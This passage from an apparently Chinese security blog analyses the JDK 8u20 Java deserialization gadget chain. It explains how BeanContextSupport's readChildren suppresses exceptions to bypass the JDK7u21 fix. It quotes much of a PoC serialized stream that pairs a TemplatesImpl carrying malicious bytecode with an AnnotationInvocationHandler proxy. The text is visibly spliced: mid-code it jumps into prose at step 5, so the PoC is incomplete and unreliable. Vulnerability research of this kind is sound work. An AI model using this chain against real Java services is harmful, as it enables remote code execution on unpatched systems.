            ...
在`AnnotationType.getInstance`方法里对this.type类型有判断,需要是annotation类型,原payload里面是`Templates`类型,所以这里会抛出错误。可以看到在readObject方法里面,是先执行`var1.defaultReadObject()`还原了对象,然后在进行验证,不符合类型则抛出异常。漏洞作者找到`java.beans.beancontext.BeanContextSupport`类对这里进行了绕过。
看下BeanContextSupport类
        private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            synchronized(BeanContext.globalHierarchyLock) {
                ois.defaultReadObject();
                initialize();
                bcsPreDeserializationHook(ois);
                if (serializable > 0 && this.equals(getBeanContextPeer()))
                    readChildren(ois);
                deserialize(ois, bcmListeners = new ArrayList(1));
            }
        }
        public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            int count = serializable;
            while (count-- > 0) {
                Object                      child = null;
                BeanContextSupport.BCSChild bscc  = null;
                try {
                    child = ois.readObject();
                    bscc  = (BeanContextSupport.BCSChild)ois.readObject();
                } catch (IOException ioe) {
                    continue;
                } catch (ClassNotFoundException cnfe) {
                    continue;
                }
                ...
可以看到在`readChildren`方法中,在执行`ois.readObject()`时,这里try
catch了,但是没有把异常抛出来,程序会接着执行。如果这里可以把`AnnotationInvocationHandler`对象在`BeanContextSupport`类第二次writeObject的时候写入`AnnotationInvocationHandler`对象,这样反序列化时,即使`AnnotationInvocationHandler`对象
this.type的值为`Templates`类型也不会报错。
反序列化还有两点就是:
  1. 反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是会抛弃掉这个成员。
  2. 每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用`TC_REFERENCE`结构,引用前面handle的值。
下面直接来看pwntester师傅提供的poc吧
    ...
    new Object[]{
                    STREAM_MAGIC, STREAM_VERSION, // stream headers
                    // (1) LinkedHashSet
                    TC_OBJECT,
                    TC_CLASSDESC,
                    LinkedHashSet.class.getName(),
                    -2851667679971038690L,
                    (byte) 2,              // flags
                    (short) 0,             // field count
                    TC_ENDBLOCKDATA,
                    TC_CLASSDESC,          // super class
                    HashSet.class.getName(),
                    -5024744406713321676L,
                    (byte) 3,              // flags
                    (short) 0,             // field count
                    TC_ENDBLOCKDATA,
                    TC_NULL,               // no superclass
                    // Block data that will be read by HashSet.readObject()
                    // Used to configure the HashSet (capacity, loadFactor, size and items)
                    TC_BLOCKDATA,
                    (byte) 12,
                    (short) 0,
                    (short) 16,            // capacity
                    (short) 16192, (short) 0, (short) 0, // loadFactor
                    (short) 2,             // size
                    // (2) First item in LinkedHashSet
                    templates, // TemplatesImpl instance with malicious bytecode
                    // (3) Second item in LinkedHashSet
                    // Templates Proxy with AIH handler
                    TC_OBJECT,
                    TC_PROXYCLASSDESC,          // proxy declaration
                    1,                          // one interface
                    Templates.class.getName(),  // the interface implemented by the proxy
                    TC_ENDBLOCKDATA,
                    TC_CLASSDESC,
                    Proxy.class.getName(),      // java.lang.Proxy class desc
                    -2222568056686623797L,      // serialVersionUID
                    SC_SERIALIZABLE,            // flags
                    (short) 2,                  // field count
                    (byte) 'L', "dummy", TC_STRING, "Ljava/lang/Object;", // dummy non-existent field
                    (byte) 'L', "h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;", // h field
                    TC_ENDBLOCKDATA,
                    TC_NULL,                    // no superclass
                    // (3) Field values
                    // value for the dummy field 0并且父类 `beanContextChildPeer`成员的值为当前对象。`BeanContextChildSupport`对象已经出现过了,这里直接进行`TC_REFERENCE`引用对应的`Handle`。
  5. 前面分析过在`readChildren`方法中会再次进行`ois.readObject()`,这里把payload里面的`AnnotationInvocationHandler`对象写入即可。这里try catch住了,并没有抛出异常,虽然`dummy`是假属性依然会进行反序列化操作,目的就是完成反序列化操作生成newHandle值,用于后面直接进行引用。
  6. 这里就是原`JDK7u21`里面的payload,把`AnnotationInvocationHandler`对象引用至前面的handle地址即可。
## 四、总结
JDK7u21和8u20这两个payload不依赖第三方的jar,只需要满足版本的JRE即可进行攻击,整条链也十分巧妙,在8u20中的几个trick也让我对Java序列化机制有了进一步的认识。
## 五、参考链接
  1. 
  2. 
  3. 
  4. 
  5. 
* * *